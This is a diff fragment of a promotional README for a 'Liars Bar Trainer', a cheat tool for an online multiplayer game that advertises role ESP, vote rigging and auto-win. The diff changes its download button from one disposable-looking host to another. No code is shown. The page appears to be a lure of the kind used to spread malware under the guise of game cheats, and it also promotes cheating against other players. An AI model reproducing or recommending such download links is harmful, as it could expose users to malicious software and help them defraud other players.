@@ -4,7 +4,7 @@
 
 If you're deep into **Liars Bar** and want to skip the confusion, lies, and endless guessing games—then the **Liars Bar Trainer** is your shortcut to total domination. Unlike bulky mod menus, a trainer is **fast, focused, and brutally effective**, letting you activate god-tier tools like **Role ESP, vote rigging, auto-win**, and **logic path skipping** with just a few hotkeys. 💡
 
-[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://fileoffload17.bitbucket.io)
+[![Download Trainer](https://img.shields.io/badge/Download-Trainer-blueviolet)](https://Liars-Bar-Trainer-va7.github.io/.github)
 ---
 
 ## 🕵️ What Is Liars Bar?
